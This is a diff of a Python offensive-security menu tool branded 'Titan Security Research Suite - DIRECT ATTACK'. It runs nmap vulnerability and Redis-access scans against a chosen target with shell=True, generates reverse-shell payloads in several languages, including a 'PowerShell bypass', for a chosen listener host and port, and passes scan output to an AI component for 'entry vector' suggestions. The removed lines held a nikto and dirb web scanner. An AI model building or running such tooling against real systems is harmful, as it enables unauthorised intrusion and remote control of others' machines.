+    "99": ("nmap --script redis-info {t}", "Redis Access Probe: Checks for unauthenticated instance access over production key databases."),
+   "100": ("nmap -p- --script vuln,safe,discovery {t}", "FINAL TITAN BOSS MODE: Executes comprehensive long-term target system auditing workflows.")
+}
+# --- THE EXECUTIVE SYSTEM ENGINE ---
+def show_header():
+    os.system('clear')
+    banner = f"""
+    {G} █████╗ ██████╗ ██████╗ ██╗   ██╗██╗         ███╗   ███╗ █████╗ ████████╗███████╗███████╗███╗   ██╗
+    {G}██╔══██╗██╔══██╗██╔══██╗██║   ██║██║         ████╗ ████║██╔══██╗╚══██╔══╝██╔════╝██╔════╝████╗  ██║
+    {W}███████║██████╔╝██║  ██║██║   ██║██║         ██╔████╔██║███████║   ██║   █████╗  █████╗  ██╔██╗ ██║
+    {W}██╔══██║██╔══██╗██║  ██║██║   ██║██║         ██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  ██╔══╝  ██║╚██╗██║
+    {R}██║  ██║██████╔╝██████╔╝╚██████╔╝███████╗    ██║ ╚═╝ ██║██║  ██║   ██║   ███████╗███████╗██║ ╚████║
+    {R}╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝
+    {C}                       [ TITAN SECURITY RESEARCH SUITE v52.0 - DIRECT ATTACK ]
+    """
+    print(banner)
+    print(f"{M}" + "="*105 + f"{RESET}")
+
+def report_status(message, mode="INFO"):
+    timestamp = time.strftime("%H:%M:%S")
+    if mode == "INFO":
+        print(f"{C}[{timestamp}] [INFO] {message}{RESET}")
+    elif mode == "ERR":
+        print(f"{R}[{timestamp}] [ERROR] {message}{RESET}")
+    elif mode == "SUC":
+        print(f"{G}[{timestamp}] [SUCCESS] {message}{RESET}")
+
+def run_command_sequence(command, reference_detail):
+    report_status(f"Initiating Target Subsystem Probing Sequence...", "INFO")
+    print(f"{W}Action Profile: {reference_detail}{RESET}")
+    print(f"{Y}Executing String: {command}{RESET}")
+    print(f"{M}" + "-"*75 + f"{RESET}")
+    
+    try:
+        execution_handle = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        captured_buffer = ""
+        for processing_line in execution_handle.stdout:
+            print(f"{W}{processing_line}{RESET}", end="")
+            captured_buffer += processing_line
+        execution_handle.wait()
+        return captured_buffer
+    except Exception as hardware_exception:
+        report_status(f"System Command Execution Protocol Failure: {hardware_exception}", "ERR")
+        return ""
+
+def process_payload_subroutine():
+    show_header()
+    print(f"{C}--- TITAN REVERSE SHELL INTERACTIVE PLAYGROUND ---{RESET}\n")
+    lhost = input(f"{W}Specify Listener Host Configuration (LHOST): {RESET}").strip()
+    lport = input(f"{W}Specify Listener Port Configuration (LPORT): {RESET}").strip()
+    
+    if not lhost or not lport:
+        report_status("Parameter registration error. Aborting template deployment.", "ERR")
+        return
+        
+    lab_handle = PayloadLab(lhost, lport)
+    print(f"\n{M}" + "-"*60)
+    print(f"{G}[+] BASH PAYLOAD:\n{W}{lab_handle.get_bash()}{RESET}\n")
+    print(f"{G}[+] PYTHON DESCRIPTOR:\n{W}{lab_handle.get_python()}{RESET}\n")
+    print(f"{G}[+] PHP PAYLOAD EXEC:\n{W}{lab_handle.get_php()}{RESET}\n")
+    print(f"{G}[+] PERL TEMPLATE:\n{W}{lab_handle.get_perl()}{RESET}\n")
+    print(f"{G}[+] POWERSHELL BYPASS:\n{W}{lab_handle.get_powershell()}{RESET}\n")
+    print(f"{G}[+] NC FIFO STACK:\n{W}{lab_handle.get_nc()}{RESET}")
+    print(f"{M}" + "-"*60)
+
+def main_orchestration_loop(target_identifier):
+    ai_engine = CyberAI()
+    auditor_instance = WebTitan(target_identifier)
+    reporter_instance = ReportManager(target_identifier)
+    
+    while True:
+        show_header()
+        print(f"{C}TARGET IP/DOMAIN: {target_identifier} | NETWORK MODE: DIRECT CONNECTION | RADAR: ON{RESET}")
+        print(f"{Y}UTILITIES: [001-100] Commands | [auto] AI Discovery | [web] Deep Web Audit | [payload] Reverse Shells | [0] Exit{RESET}\n")
+
+        for mapping_index in range(1, 101):
+            string_key = str(mapping_index)
+            print(f"[{G}{string_key.zfill(3)}{RESET}]", end="  ")
+            if mapping_index % 10 == 0:
+                print()
+
+        user_input_choice = input(f"\n\n{M}[ABDUL-MATEEN@TITAN-ROOT]# {RESET}").strip().lower()
+
+        if user_input_choice == '0':
+            reporter_instance.write_json_to_disk()
+            report_status("Titan Framework operational lifecycle terminated safely.", "SUC")
+            break
+
+        if user_input_choice == 'auto':
+            report_status("Launching automated surface map routine...", "INFO")
+            base_reconnaissance_data = subprocess.getoutput(f"nmap -F --open {target_identifier}")
+            print(f"{W}{base_reconnaissance_data}{RESET}")
+            evaluated_tips = ai_engine.get_recommendations(base_reconnaissance_data)
+            
+            if evaluated_tips:
+                print(f"\n{C}--- AI ARCHITECT STRUCTURAL RECOMMENDATIONS ---{RESET}")
+                for tracking_tip in evaluated_tips:
+                    print(tracking_tip)
+            else:
+                report_status("AI Engine parsed execution patterns but found no obvious entry vectors.", "ERR")
+            input(f"\n{Y}Press Enter to safely cycle back to the dashboard...{RESET}")
+            continue
+
+        if user_input_choice == 'web':
+            auditor_instance.run_recon()
+            auditor_instance.run_waf_check()
+            auditor_instance.run_directories()
+            auditor_instance.run_vulnerabilities()
+            input(f"\n{Y}Target website parsing finished. Press Enter to return...{RESET}")
+            continue
+
+        if user_input_choice == 'payload':
+            process_payload_subroutine()
+            input(f"\n{Y}Template export complete. Press Enter to return...{RESET}")
+            continue
+
+        if user_input_choice in cmd_list:
+            command_template_string, details_string = cmd_list[user_input_choice]
+            final_executable_command = command_template_string.replace("{t}", target_identifier)
+            
+            raw_execution_output = run_command_sequence(final_executable_command, details_string)
+            reporter_instance.append_scan_record(final_executable_command, raw_execution_output)
+            
+            detected_error, remedial_advice = ai_engine.analyze_output(raw_execution_output)
+            if detected_error:
+                report_status(f"SECURITY THREAT BLOCKED: {detected_error} -> {remedial_advice}", "ERR")
+            else:
+                report_status("Target transaction sequence closed successfully without protocol flags.", "SUC")
+            
+            input(f"\n{Y}Operational frame complete. Press Enter to safely cycle back to the dashboard...{RESET}")
         else:
-            print(f"{R}Error: 001-100 tak choose karein.{RESET}")
+            report_status("Invalid selection profile matrix. Choose standard operational bounds.", "ERR")
             time.sleep(1)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Aborted by user.{RESET}")
-        # --- Web Vulnerability & Bug Hunting Module ---
-def run_web_scanner(target):
-    import subprocess
-    import os
+    if os.getuid() != 0:
+        print(f"{R}[!] CRITICAL ACCESS ERROR: Titan Core architecture mandates local ROOT privileges for raw socket framing.{RESET}")
+        sys.exit(1)
 
-    print(f"\n[+] Abdul Mateen Web Scanner Starting on: {target}")
-    
-    # Commands ki list: [Tool Name, Command]
-    web_commands = [
-        ["Nikto", f"nikto -h {target} -Tuning 1234589 -o nikto_report.txt"],
-        ["Nikto XSS/Subdomain", f"nikto -h {target} -Plugins 'apache_expect_xss,subdomain'"],
-        ["Warp Scan", f"nmap --script http-enum,http-vhosts,http-methods {target}"],
-        ["Dirb (Directory Search)", f"dirb http://{target} -f"]
-    ]
-
-    for tool_name, cmd in web_commands:
-        print(f"\n[*] Running {tool_name}...")
+    show_header()
+    runtime_host_argument = input(f"{W}Provide Target Destination Coordinates (IP / Namespace Domain): {RESET}").strip()
+    if runtime_host_argument:
         try:
-            # Yeh command execute karega aur result terminal pe dikhayega
-            subprocess.run(cmd, shell=True, check=True)
-        except Exception as e:
-            print(f"[!] Error running {tool_name}: {e}")
-
-# Is line ko aap apne main menu ya loop ke andar call kar sakte hain
-# Agar aap chahte hain ke script khatam hote hi yeh khud chal jaye, toh niche wali line ko uncomment (hata dein #) kar dein:
-# run_web_scanner(target)
+            main_orchestration_loop(runtime_host_argument)
+        except KeyboardInterrupt:
+            print(f"\n{R}[!] CRITICAL INTERRUPT: Manual runtime abort received. Closing operational threads.{RESET}")
+    else:
+        print(f"{R}[!] PROCESSING FAILURE: Initialization parameter empty. Aborting run.{RESET}")
